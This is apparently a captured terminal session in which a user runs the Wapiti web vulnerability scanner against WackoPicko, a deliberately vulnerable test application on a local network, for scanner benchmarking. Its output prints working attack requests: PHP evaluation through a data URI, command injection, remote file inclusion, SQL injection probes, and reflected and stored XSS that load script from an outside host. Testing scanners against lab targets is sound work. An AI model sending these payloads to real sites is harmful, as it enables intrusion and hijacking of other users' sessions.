@@ -1,0 +1,191 @@
+Last login: Wed Aug  8 21:43:24 on ttys003
+Ranas-MacBook-Air:bin ranakhalil$ ls
+cookie.json					wapiti-getcookie				wapiti-wavsep-script-txt.sh
+cookies.json					wapiti-wackopicko-default-config-result.txt	wapiti-wavsep-script.sh
+wapiti						wapiti-wackopicko-default-config-script.sh	wapiti-wivet-default-script.sh
+Ranas-MacBook-Air:bin ranakhalil$ rm cookie.json
+Ranas-MacBook-Air:bin ranakhalil$ rm cookies.json
+Ranas-MacBook-Air:bin ranakhalil$ wapiti-getcookie -u http://192.168.0.26/WackoPicko/users/login.php -c cookies.json
+<Cookie PHPSESSID=cnu3et3ve99ioclpq6kmtruh13 for 192.168.0.26/>
+
+Choose the form you want to use or enter 'q' to leave :
+0) GET http://192.168.0.26/WackoPicko/pictures/search.php?query=&x=1&y=1 (0)
+1) POST http://192.168.0.26/WackoPicko/users/login.php (0)
+
+Enter a number : 1
+
+Please enter values for the following form: 
+url = http://192.168.0.26/WackoPicko/users/login.php
+<Cookie PHPSESSID=cnu3et3ve99ioclpq6kmtruh13 for 192.168.0.26/>
+Ranas-MacBook-Air:bin ranakhalil$ wapiti-getcookie -u http://192.168.0.26/WackoPicko/users/login.php -c cookies.json -d "username=bryce&password=bryce"
+<Cookie PHPSESSID=pvd434llpmanoq0t1879n47nb5 for 192.168.0.26/>
+<Cookie PHPSESSID=pvd434llpmanoq0t1879n47nb5 for 192.168.0.26/>
+Ranas-MacBook-Air:bin ranakhalil$ open .
+Ranas-MacBook-Air:bin ranakhalil$ open .
+Ranas-MacBook-Air:bin ranakhalil$ ls
+cookies.json					wapiti-wackopicko-configured-config-script.sh	wapiti-wavsep-script.sh
+wapiti						wapiti-wackopicko-default-config-script.sh	wapiti-wivet-default-script.sh
+wapiti-getcookie				wapiti-wavsep-script-txt.sh
+Ranas-MacBook-Air:bin ranakhalil$ bash wapiti-wa
+wapiti-wackopicko-configured-config-script.sh  wapiti-wavsep-script-txt.sh                    
+wapiti-wackopicko-default-config-script.sh     wapiti-wavsep-script.sh                        
+Ranas-MacBook-Air:bin ranakhalil$ bash wapiti-wackopicko-default-config-script.sh 
+
+     __    __            _ _   _ _____
+    / / /\ \ \__ _ _ __ (_) |_(_)___ /
+    \ \/  \/ / _` | '_ \| | __| | |_ \ 
+     \  /\  / (_| | |_) | | |_| |___) |
+      \/  \/ \__,_| .__/|_|\__|_|____/
+                  |_|                 
+Wapiti-3.0.1 (wapiti.sourceforge.net)
+[*] Saving scan state, please wait...
+
+ Note
+========
+This scan has been saved in the file /Users/ranakhalil/.wapiti/scans/192.168.0.26_folder_edc21351.db
+[*] Wapiti found 77 URLs and forms during the scan
+[*] Loading modules:
+	 mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock, mod_methods, mod_ssrf
+
+[*] Launching module exec
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    GET /WackoPicko/admin/index.php?page=%3Benv HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+PHP evaluation in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    POST /WackoPicko/admin/index.php?page=%3Benv HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+---
+PHP evaluation in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+---
+Blind command execution in http://192.168.0.26/WackoPicko/passcheck.php via injection in the parameter password
+Evil request:
+    POST /WackoPicko/passcheck.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/passcheck.php
+    Content-Type: application/x-www-form-urlencoded
+
+    password=a%60sleep%2060%60
+---
+
+[*] Launching module file
+---
+Remote inclusion vulnerability in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    GET /WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Timeout occurred in http://192.168.0.26/WackoPicko/calendar.php
+Evil request:
+    GET /WackoPicko/calendar.php?date=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Remote inclusion vulnerability in http://192.168.0.26/WackoPicko/admin/index.php via injection in the parameter page
+Evil request:
+    POST /WackoPicko/admin/index.php?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module sql
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    GET /WackoPicko/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    POST /WackoPicko/admin/index.php?page=%C2%BF%27%22%28 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module xss
+---
+XSS vulnerability in http://192.168.0.26/WackoPicko/pictures/search.php via injection in the parameter query
+Evil request:
+    GET /WackoPicko/pictures/search.php?query=%22%2F%3E%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwj1slcuslfz.js%3E%3C%2Fscript%3E&x=1&y=1 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/
+---
+---
+XSS vulnerability in http://192.168.0.26/WackoPicko/guestbook.php via injection in the parameter comment
+Evil request:
+    POST /WackoPicko/guestbook.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwwc088s5i6z.js%3E%3C%2Fscript%3E
+---
+
+[*] Launching module ssrf
+
+[*] Launching module blindsql
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    GET /WackoPicko/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.0.26
+---
+---
+Received a HTTP 500 error in http://192.168.0.26/WackoPicko/admin/index.php
+Evil request:
+    POST /WackoPicko/admin/index.php?page=sleep%287%29%231 HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/admin/index.php?page=login
+    Content-Type: application/x-www-form-urlencoded
+
+    adminname=default&password=letmein
+---
+
+[*] Launching module permanentxss
+---
+Stored XSS vulnerability in http://192.168.0.26/WackoPicko/guestbook.php via injection in the parameter comment
+Evil request:
+    POST /WackoPicko/guestbook.php HTTP/1.1
+    Host: 192.168.0.26
+    Referer: http://192.168.0.26/WackoPicko/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=default&comment=%3Cscript%20src%3Dhttps%3A%2F%2Fwapiti3.ovh%2Fwwc088s5i6z.js%3E%3C%2Fscript%3E
+---
+
+Report
+------
+A report has been generated in the file wapiti-wackopicko-default-config-result.txt
+Ranas-MacBook-Air:bin ranakhalil$ open .
+Ranas-MacBook-Air:bin ranakhalil$ 
